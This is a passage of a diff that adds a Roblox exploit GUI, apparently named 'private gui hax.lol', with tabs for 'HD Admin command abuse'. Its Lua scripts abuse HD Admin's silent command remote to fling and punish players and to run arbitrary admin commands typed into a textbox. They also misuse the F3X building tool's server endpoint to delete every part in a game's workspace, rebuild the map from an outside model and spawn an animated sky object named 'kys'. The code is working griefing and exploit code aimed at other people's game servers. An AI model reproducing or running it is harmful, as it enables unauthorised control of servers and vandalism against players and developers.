+	script.Parent.MouseButton1Click:Connect(function()
+		local rs = game:GetService("ReplicatedStorage")
+		local Players = game:GetService("Players")
+	
+		local who = script.Parent.Parent.TextBoxPlayer.Text
+	
+		local hd = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		for _, koop in pairs(Players:GetPlayers()) do
+			if koop.Name == who then
+				hd:InvokeServer(";fling " .. koop.Name)
+				break
+			end
+		end
+	end)
+end;
+task.spawn(C_278);
+-- StarterGui.private gui hax.lol.Credit tab.LocalScript
+function C_28c()
+local script = G2L["28c"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HomePage.Visible = false
+		script.Parent.Parent.F3XtabPage.Visible = false
+		script.Parent.Parent["HDA Command Abuse tab Page"].Visible = false
+		script.Parent.Parent["LocalPlayer tab Page"].Visible = false
+		script.Parent.Parent["Audio tab Page"].Visible = false
+		script.Parent.Parent["Executor tab Page"].Visible = false
+		script.Parent.Parent["ScriptHub F3X Page"].Visible = false
+		script.Parent.Parent["Credit tab Page"].Visible = true
+		script.Parent.Parent["HD Abuse 2 tab Page"].Visible = false
+		script.Parent.Parent["Gui Page"].Visible = false
+	end)
+end;
+task.spawn(C_28c);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab.LocalScript
+function C_28e()
+local script = G2L["28e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HomePage.Visible = false
+		script.Parent.Parent.F3XtabPage.Visible = false
+		script.Parent.Parent["HDA Command Abuse tab Page"].Visible = false
+		script.Parent.Parent["LocalPlayer tab Page"].Visible = false
+		script.Parent.Parent["Audio tab Page"].Visible = false
+		script.Parent.Parent["Executor tab Page"].Visible = false
+		script.Parent.Parent["ScriptHub F3X Page"].Visible = false
+		script.Parent.Parent["Credit tab Page"].Visible = false
+		script.Parent.Parent["HD Abuse 2 tab Page"].Visible = true
+		script.Parent.Parent["Gui Page"].Visible = false
+	end)
+end;
+task.spawn(C_28e);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.Button.LocalScript
+function C_293()
+local script = G2L["293"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- animated skyBox by Elv4r0x (original script by ItsKIttyGD)
+	
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local tool
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		hd:InvokeServer(";time 0")
+		hd:InvokeServer(";fogcolor black")
+	
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+				tool = v.Parent
+			end
+		end
+	
+		if tool == nil then
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local RunService = game:GetService("RunService")
+	
+		function _(args)
+			return remote:InvokeServer(unpack(args))
+		end
+	
+		local function CreatePart(cf, parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			return _(args)
+		end
+	
+		function SetAnchor(part, boolean)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid,texid,size,vertexcolor)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid,
+						["TextureId"] = texid,
+						["Scale"] = size,
+						["VertexColor"] = vertexcolor or Vector3.new(4.5, 4.5, 4.5)
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function SetTransparency(part, value)
+			task.spawn(function()
+				local args = {
+					[1] = "SyncMaterial",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Transparency"] = value
+						}
+					}
+				}
+				_(args)
+			end)
+		end
+	
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+	
+		local function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+			_(args)
+		end
+	
+		local replaceSky1 = workspace:FindFirstChild("kys")
+		if replaceSky1 then
+			DestroyPart(replaceSky1)
+		end
+	
+		local replaceSkyShit2 = workspace:FindFirstChild("kys")
+		if replaceSkyShit2 then
+			DestroyPart(replaceSkyShit2)
+		end
+	
+		local images = {
+			"rbxassetid://5039311089",
+			"rbxassetid://5039490008"
+		}
+	
+		local skyPart = nil
+		local skyLoop = nil
+		local frameTime = 1 / 10
+		local lastUpdate = 0
+	
+		function CreateSky()
+			local hrp = char:FindFirstChild("HumanoidRootPart")
+			if not hrp then return end
+	
+			local cf = hrp.CFrame
+			skyPart = CreatePart(CFrame.new(cf.Position + Vector3.new(0, 1000, 0)), workspace)
+			task.spawn(function() AddMesh(skyPart) end)
+			task.spawn(function() SetMesh(skyPart, "111891702759441", images[1], Vector3.new(100999, 100999, 100999), Vector3.new(4.5, 4.5, 4.5)) end)
+			task.spawn(function() SetTransparency(skyPart, 1) end)
+			task.spawn(function() SetName(skyPart, "kys") end)
+			task.spawn(function() SetAnchor(skyPart, true) end)
+	
+			local index = 1
+			skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
+				lastUpdate = lastUpdate + deltaTime
+				if lastUpdate >= frameTime then
+					lastUpdate = 0
+					if not skyPart or not skyPart.Parent then
+						if skyLoop then skyLoop:Disconnect() end
+						return
+					end
+					task.spawn(function() SetTransparency(skyPart, 0) end)
+					task.spawn(function() SetMesh(skyPart, "111891702759441", images[index], Vector3.new(100999, 100999, 100999), Vector3.new(4.5, 4.5, 4.5)) end)
+					index = index % #images + 1
+				end
+			end)
+		end
+	
+		function ResetSky()
+			if skyPart then
+				task.spawn(function() DestroyPart(skyPart) end)
+				skyPart = nil
+			end
+			if skyLoop then
+				skyLoop:Disconnect()
+				skyLoop = nil
+			end
+			task.wait(0.1)
+			CreateSky()
+		end
+	
+		player.CharacterAdded:Connect(function(newChar)
+			char = newChar
+			task.wait(0.2)
+			ResetSky()
+		end)
+	
+		if char and char:FindFirstChild("Humanoid") then
+			char:WaitForChild("Humanoid").Died:Connect(function()
+				task.wait(0.2)
+				ResetSky()
+			end)
+		end
+	
+		CreateSky()
+	end)
+end;
+task.spawn(C_293);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.Button.LocalScript
+function C_295()
+local script = G2L["295"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- animated skyBox by Elv4r0x (original script by ItsKIttyGD)
+	
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local tool
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		hd:InvokeServer(";time 0")
+		hd:InvokeServer(";fogcolor black")
+	
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+				tool = v.Parent
+			end
+		end
+	
+		if tool == nil then
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local RunService = game:GetService("RunService")
+	
+		function _(args)
+			return remote:InvokeServer(unpack(args))
+		end
+	
+		local function CreatePart(cf, parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			return _(args)
+		end
+	
+		function SetAnchor(part, boolean)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid,texid,size,vertexcolor)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid,
+						["TextureId"] = texid,
+						["Scale"] = size,
+						["VertexColor"] = vertexcolor or Vector3.new(4.5, 4.5, 4.5)
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function SetTransparency(part, value)
+			task.spawn(function()
+				local args = {
+					[1] = "SyncMaterial",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Transparency"] = value
+						}
+					}
+				}
+				_(args)
+			end)
+		end
+	
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+	
+		local function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+			_(args)
+		end
+	
+		local replaceSky1 = workspace:FindFirstChild("kys")
+		if replaceSky1 then
+			DestroyPart(replaceSky1)
+		end
+	
+		local replaceSkyShit2 = workspace:FindFirstChild("kys")
+		if replaceSkyShit2 then
+			DestroyPart(replaceSkyShit2)
+		end
+	
+		local images = {
+			"rbxassetid://50767914",
+			"rbxassetid://50767923",
+			"rbxassetid://50767933",
+			"rbxassetid://50767945",
+			"rbxassetid://50767959",
+			"rbxassetid://50767974",
+			"rbxassetid://50767980",
+			"rbxassetid://50767996",
+			"rbxassetid://50768017",
+			"rbxassetid://50768029",
+			"rbxassetid://50768034",
+			"rbxassetid://50768048"
+		}
+	
+		local skyPart = nil
+		local skyLoop = nil
+		local frameTime = 1 / 10
+		local lastUpdate = 0
+	
+		function CreateSky()
+			local hrp = char:FindFirstChild("HumanoidRootPart")
+			if not hrp then return end
+	
+			local cf = hrp.CFrame
+			skyPart = CreatePart(CFrame.new(cf.Position + Vector3.new(0, 1000, 0)), workspace)
+			task.spawn(function() AddMesh(skyPart) end)
+			task.spawn(function() SetMesh(skyPart, "111891702759441", images[1], Vector3.new(100999, 100999, 100999), Vector3.new(4.5, 4.5, 4.5)) end)
+			task.spawn(function() SetTransparency(skyPart, 1) end)
+			task.spawn(function() SetName(skyPart, "kys") end)
+			task.spawn(function() SetAnchor(skyPart, true) end)
+	
+			local index = 1
+			skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
+				lastUpdate = lastUpdate + deltaTime
+				if lastUpdate >= frameTime then
+					lastUpdate = 0
+					if not skyPart or not skyPart.Parent then
+						if skyLoop then skyLoop:Disconnect() end
+						return
+					end
+					task.spawn(function() SetTransparency(skyPart, 0) end)
+					task.spawn(function() SetMesh(skyPart, "111891702759441", images[index], Vector3.new(100999, 100999, 100999), Vector3.new(4.5, 4.5, 4.5)) end)
+					index = index % #images + 1
+				end
+			end)
+		end
+	
+		function ResetSky()
+			if skyPart then
+				task.spawn(function() DestroyPart(skyPart) end)
+				skyPart = nil
+			end
+			if skyLoop then
+				skyLoop:Disconnect()
+				skyLoop = nil
+			end
+			task.wait(0.1)
+			CreateSky()
+		end
+	
+		player.CharacterAdded:Connect(function(newChar)
+			char = newChar
+			task.wait(0.2)
+			ResetSky()
+		end)
+	
+		if char and char:FindFirstChild("Humanoid") then
+			char:WaitForChild("Humanoid").Died:Connect(function()
+				task.wait(0.2)
+				ResetSky()
+			end)
+		end
+	
+		CreateSky()
+	end)
+end;
+task.spawn(C_295);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.Button.LocalScript
+function C_297()
+local script = G2L["297"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- animated skyBox by Elv4r0x (original script by ItsKIttyGD)
+	
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local tool
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		hd:InvokeServer(";time 0")
+		hd:InvokeServer(";fogcolor black")
+	
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+				tool = v.Parent
+			end
+		end
+	
+		if tool == nil then
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local RunService = game:GetService("RunService")
+	
+		function _(args)
+			return remote:InvokeServer(unpack(args))
+		end
+	
+		local function CreatePart(cf, parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			return _(args)
+		end
+	
+		function SetAnchor(part, boolean)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid,texid,size,vertexcolor)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid,
+						["TextureId"] = texid,
+						["Scale"] = size,
+						["VertexColor"] = vertexcolor or Vector3.new(4.5, 4.5, 4.5)
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function SetTransparency(part, value)
+			task.spawn(function()
+				local args = {
+					[1] = "SyncMaterial",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Transparency"] = value
+						}
+					}
+				}
+				_(args)
+			end)
+		end
+	
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+	
+		local function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+			_(args)
+		end
+	
+		local replaceSky1 = workspace:FindFirstChild("kys")
+		if replaceSky1 then
+			DestroyPart(replaceSky1)
+		end
+	
+		local replaceSkyShit2 = workspace:FindFirstChild("kys")
+		if replaceSkyShit2 then
+			DestroyPart(replaceSkyShit2)
+		end
+	
+		local images = {
+			"rbxassetid://14136255367", --1
+			"rbxassetid://14136321407", --2
+			"rbxassetid://14136455233", --3
+			"rbxassetid://14136690755", --4
+			"rbxassetid://14136717479", --5
+			"rbxassetid://14136751567", --6
+			"rbxassetid://14148042825" --7
+		}
+	
+		local skyPart = nil
+		local skyLoop = nil
+		local frameTime = 0.05
+		local lastUpdate = 0
+	
+		function CreateSky()
+			local hrp = char:FindFirstChild("HumanoidRootPart")
+			if not hrp then return end
+	
+			local cf = hrp.CFrame
+			skyPart = CreatePart(CFrame.new(cf.Position + Vector3.new(0, 1000, 0)), workspace)
+			task.spawn(function() AddMesh(skyPart) end)
+			task.spawn(function() SetMesh(skyPart, "111891702759441", images[1], Vector3.new(100999, 100999, 100999), Vector3.new(4.5, 4.5, 4.5)) end)
+			task.spawn(function() SetTransparency(skyPart, 1) end)
+			task.spawn(function() SetName(skyPart, "kys") end)
+			task.spawn(function() SetAnchor(skyPart, true) end)
+	
+			local index = 1
+			skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
+				lastUpdate = lastUpdate + deltaTime
+				if lastUpdate >= frameTime then
+					lastUpdate = 0
+					if not skyPart or not skyPart.Parent then
+						if skyLoop then skyLoop:Disconnect() end
+						return
+					end
+					task.spawn(function() SetTransparency(skyPart, 0) end)
+					task.spawn(function() SetMesh(skyPart, "111891702759441", images[index], Vector3.new(100999, 100999, 100999), Vector3.new(4.5, 4.5, 4.5)) end)
+					index = index % #images + 1
+				end
+			end)
+		end
+	
+		function ResetSky()
+			if skyPart then
+				task.spawn(function() DestroyPart(skyPart) end)
+				skyPart = nil
+			end
+			if skyLoop then
+				skyLoop:Disconnect()
+				skyLoop = nil
+			end
+			task.wait(0.1)
+			CreateSky()
+		end
+	
+		player.CharacterAdded:Connect(function(newChar)
+			char = newChar
+			task.wait(0.2)
+			ResetSky()
+		end)
+	
+		if char and char:FindFirstChild("Humanoid") then
+			char:WaitForChild("Humanoid").Died:Connect(function()
+				task.wait(0.2)
+				ResetSky()
+			end)
+		end
+	
+		CreateSky()
+	end)
+end;
+task.spawn(C_297);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.Button.LocalScript
+function C_299()
+local script = G2L["299"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- animated skyBox by Elv4r0x (original script by ItsKIttyGD)
+	
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local tool
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local hd = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		hd:InvokeServer(";time 0")
+		hd:InvokeServer(";fogcolor black")
+	
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+				tool = v.Parent
+			end
+		end
+	
+		if tool == nil then
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local RunService = game:GetService("RunService")
+	
+		function _(args)
+			return remote:InvokeServer(unpack(args))
+		end
+	
+		local function CreatePart(cf, parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			return _(args)
+		end
+	
+		function SetAnchor(part, boolean)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid,texid,size,vertexcolor)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid,
+						["TextureId"] = texid,
+						["Scale"] = size,
+						["VertexColor"] = vertexcolor or Vector3.new(4.5, 4.5, 4.5)
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function SetTransparency(part, value)
+			task.spawn(function()
+				local args = {
+					[1] = "SyncMaterial",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Transparency"] = value
+						}
+					}
+				}
+				_(args)
+			end)
+		end
+	
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+	
+		local function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+			_(args)
+		end
+	
+		local replaceSky1 = workspace:FindFirstChild("kys")
+		if replaceSky1 then
+			DestroyPart(replaceSky1)
+		end
+	
+		local replaceSkyShit2 = workspace:FindFirstChild("kys")
+		if replaceSkyShit2 then
+			DestroyPart(replaceSkyShit2)
+		end
+	
+		local images = {
+			"rbxassetid://88387114383441",
+			"rbxassetid://80307658796395",
+			"rbxassetid://89698227663709",
+			"rbxassetid://94071530336475",
+			"rbxassetid://132128840663861",
+			"rbxassetid://73640982883614"
+		}
+	
+		local skyPart = nil
+		local skyLoop = nil
+		local frameTime = 1 / 10
+		local lastUpdate = 0
+	
+		function CreateSky()
+			local hrp = char:FindFirstChild("HumanoidRootPart")
+			if not hrp then return end
+	
+			local cf = hrp.CFrame
+			skyPart = CreatePart(CFrame.new(cf.Position + Vector3.new(0, 1000, 0)), workspace)
+			task.spawn(function() AddMesh(skyPart) end)
+			task.spawn(function() SetMesh(skyPart, "111891702759441", images[1], Vector3.new(100999, 100999, 100999), Vector3.new(4.5, 4.5, 4.5)) end)
+			task.spawn(function() SetTransparency(skyPart, 1) end)
+			task.spawn(function() SetName(skyPart, "kys") end)
+			task.spawn(function() SetAnchor(skyPart, true) end)
+	
+			local index = 1
+			skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
+				lastUpdate = lastUpdate + deltaTime
+				if lastUpdate >= frameTime then
+					lastUpdate = 0
+					if not skyPart or not skyPart.Parent then
+						if skyLoop then skyLoop:Disconnect() end
+						return
+					end
+					task.spawn(function() SetTransparency(skyPart, 0) end)
+					task.spawn(function() SetMesh(skyPart, "111891702759441", images[index], Vector3.new(100999, 100999, 100999), Vector3.new(4.5, 4.5, 4.5)) end)
+					index = index % #images + 1
+				end
+			end)
+		end
+	
+		function ResetSky()
+			if skyPart then
+				task.spawn(function() DestroyPart(skyPart) end)
+				skyPart = nil
+			end
+			if skyLoop then
+				skyLoop:Disconnect()
+				skyLoop = nil
+			end
+			task.wait(0.1)
+			CreateSky()
+		end
+	
+		player.CharacterAdded:Connect(function(newChar)
+			char = newChar
+			task.wait(0.2)
+			ResetSky()
+		end)
+	
+		if char and char:FindFirstChild("Humanoid") then
+			char:WaitForChild("Humanoid").Died:Connect(function()
+				task.wait(0.2)
+				ResetSky()
+			end)
+		end
+	
+		CreateSky()
+	end)
+end;
+task.spawn(C_299);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate.Button.LocalScript
+function C_29b()
+local script = G2L["29b"];
+	-- idk lol
+end;
+task.spawn(C_29b);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ExecuteBTN.LocalScript
+function C_29f()
+local script = G2L["29f"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local cmd = script.Parent.Parent.TextBoxCMD
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer("; " .. cmd.Text)
+	end)
+end;
+task.spawn(C_29f);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button.LocalScript
+function C_2a5()
+local script = G2L["2a5"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- fixed by 1sw0rd1
+		-- credit to 1sword1
+		-- (edited script anti crash by Elv4r0x)
+	
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local character = player.Character 
+		local char = player.Character
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";punish all ;time 14")
+	
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+			return
+		end
+	
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					serverendpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function delete(part)
+			ohno({"Remove", {part}})
+		end
+	
+		local function deleteall()
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if (v:IsA("BasePart") or v:IsA("UnionOperation")) and v.Name ~= "kys" then
+					task.defer(function()
+						pcall(function()
+							delete(v)
+						end)
+					end)
+				end
+			end
+		end
+	
+		deleteall()
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+				tool = v.Parent
+			end
+		end
+		if tool == nil then
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+	
+		local model_id = "120010663107698"
+		local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
+		imported_model.Parent = game.Lighting
+	
+		local destination = workspace:FindFirstChildOfClass("Terrain")
+		if tool ~= nil and tool:FindFirstChild("Tools") and tool:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+			destination = workspace
+		end
+	
+		for _, v in next, imported_model:GetDescendants() do
+			pcall(function() v.Anchored = true end)
+		end
+	
+		local totalparts = {}
+		local total = 0
+		local completed = 0
+	
+		for i,v in pairs(imported_model:GetDescendants()) do
+			if v:IsA("Part") or v:IsA("WedgePart") or v:IsA("Seat") or v:IsA("VehicleSeat") or v:IsA("TrussPart") or v:IsA("SpawnLocation") or v:IsA("CornerWedgePart") then
+				total += 1
+				local Type = v:IsA("WedgePart") and "Wedge" or v:IsA("Seat") and "Seat" or v:IsA("VehicleSeat") and "Vehicle Seat" or v:IsA("TrussPart") and "Truss" or v:IsA("SpawnLocation") and "Spawn" or v:IsA("CornerWedgePart") and "Corner" or
+					v.Shape == Enum.PartType.Block and "Normal" or
+					v.Shape == Enum.PartType.Ball and "Ball" or
+					v.Shape == Enum.PartType.Cylinder and "Cylinder"
+				task.defer(function()
+					local part = remote:InvokeServer("CreatePart", Type, v.CFrame, destination)
+					table.insert(totalparts, {new = part, old = v})
+					completed += 1
+				end)
+			end
+		end
+	
+		while completed < total do
+			task.wait()
+		end
+	
+		local syncResize = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncResize, {Part = data.new, CFrame = data.old.CFrame, Size = data.old.Size})
+		end
+		remote:InvokeServer("SyncResize", syncResize)
+	
+		local syncCollision = {}
+		for i,data in pairs(totalparts) do
+			if data.old.CanCollide ~= true then
+				table.insert(syncCollision, {Part = data.new, CanCollide = data.old.CanCollide})
+			end
+		end
+		if #syncCollision > 0 then
+			remote:InvokeServer("SyncCollision", syncCollision)
+		end
+	
+		local syncColor = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncColor, {Part = data.new, Color = data.old.Color})
+		end
+		remote:InvokeServer("SyncColor", syncColor)
+	
+		local syncMaterial = {}
+		for i,data in pairs(totalparts) do
+			if data.old.Material ~= "Plastic" or data.old.Reflectance ~= 0 or data.old.Transparency ~= 0 then
+				table.insert(syncMaterial, {Part = data.new, Material = data.old.Material, Transparency = data.old.Transparency, Reflectance = data.old.Reflectance})
+			end
+		end
+		if #syncMaterial > 0 then
+			remote:InvokeServer("SyncMaterial", syncMaterial)
+		end
+	
+		local syncSurface = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncSurface, {Part = data.new, Surfaces = {Top = data.old.TopSurface, Front = data.old.FrontSurface, Bottom = data.old.BottomSurface, Right = data.old.RightSurface, Left = data.old.LeftSurface, Back = data.old.BackSurface}})
+		end
+		remote:InvokeServer("SyncSurface", syncSurface)
+	
+		local createMeshes = {}
+		local syncMesh = {}
+		for i,data in pairs(totalparts) do
+			local mesh = data.old:FindFirstChildOfClass("SpecialMesh")
+			if mesh then
+				table.insert(createMeshes, {Part = data.new})
+				table.insert(syncMesh, {Part = data.new, MeshId = mesh.MeshId, TextureId = mesh.TextureId, Scale = mesh.Scale, MeshType = mesh.MeshType, VertexColor = mesh.VertexColor})
+			end
+		end
+		if #createMeshes > 0 then
+			remote:InvokeServer("CreateMeshes", createMeshes)
+			remote:InvokeServer("SyncMesh", syncMesh)
+		end
+	
+		local createMeshesCyl = {}
+		for i,data in pairs(totalparts) do
+			local mesh = data.old:FindFirstChildOfClass("CylinderMesh")
+			if mesh then
+				table.insert(createMeshesCyl, {Part = data.new})
+			end
+		end
+		if #createMeshesCyl > 0 then
+			remote:InvokeServer("CreateMeshes", createMeshesCyl)
+		end
+	
+		local createLightsSpot = {}
+		local syncLightSpot = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("SpotLight")
+			if light then
+				table.insert(createLightsSpot, {Part = data.new, LightType = "SpotLight"})
+				table.insert(syncLightSpot, {Part = data.new, LightType = "SpotLight", Color = light.Color, Range = light.Range, Face = light.Face, Angle = light.Angle, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsSpot > 0 then
+			remote:InvokeServer("CreateLights", createLightsSpot)
+			remote:InvokeServer("SyncLighting", syncLightSpot)
+		end
+	
+		local createLightsPoint = {}
+		local syncLightPoint = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("PointLight")
+			if light then
+				table.insert(createLightsPoint, {Part = data.new, LightType = "PointLight"})
+				table.insert(syncLightPoint, {Part = data.new, LightType = "PointLight", Color = light.Color, Range = light.Range, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsPoint > 0 then
+			remote:InvokeServer("CreateLights", createLightsPoint)
+			remote:InvokeServer("SyncLighting", syncLightPoint)
+		end
+	
+		local createLightsSurface = {}
+		local syncLightSurface = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("SurfaceLight")
+			if light then
+				table.insert(createLightsSurface, {Part = data.new, LightType = "SurfaceLight"})
